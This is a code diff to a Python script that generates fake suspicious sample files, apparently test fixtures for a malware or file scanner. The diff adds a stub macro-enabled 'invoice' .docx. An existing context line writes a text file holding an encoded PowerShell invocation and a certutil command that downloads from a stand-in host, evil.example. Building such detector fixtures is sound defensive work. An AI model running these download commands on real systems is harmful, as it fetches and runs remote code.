@@ -69,6 +69,14 @@ def _zip_with_executable() -> bytes:
     ])
 
 
+def _docx_with_macro() -> bytes:
+    return _build_zip([
+        ("[Content_Types].xml", b"<Types/>"),
+        ("word/document.xml", b"<document>Please enable macros.</document>"),
+        ("word/vbaProject.bin", b"\xcc\x61\xff\xffMACRO\x00markers\x00AutoOpen"),
+    ])
+
+
 def main() -> None:
     made = [
         _write(BENIGN, "hello.txt", b"Just a normal text file.\n" * 20),
@@ -78,6 +86,7 @@ def main() -> None:
         _write(SUSPICIOUS, "malicious.pdf", _pdf_with_javascript()),
         _write(SUSPICIOUS, "hidden_payload.pdf", _pdf_with_embedded_pe()),
         _write(SUSPICIOUS, "dropper.zip", _zip_with_executable()),
+        _write(SUSPICIOUS, "invoice_macro.docx", _docx_with_macro()),
         _write(SUSPICIOUS, "obfuscated.txt", b"powershell -enc " + b"A" * 80 + b"\ncmd.exe /c certutil -urlcache http://evil.example/x"),
     ]
     print("Generated sample files:")
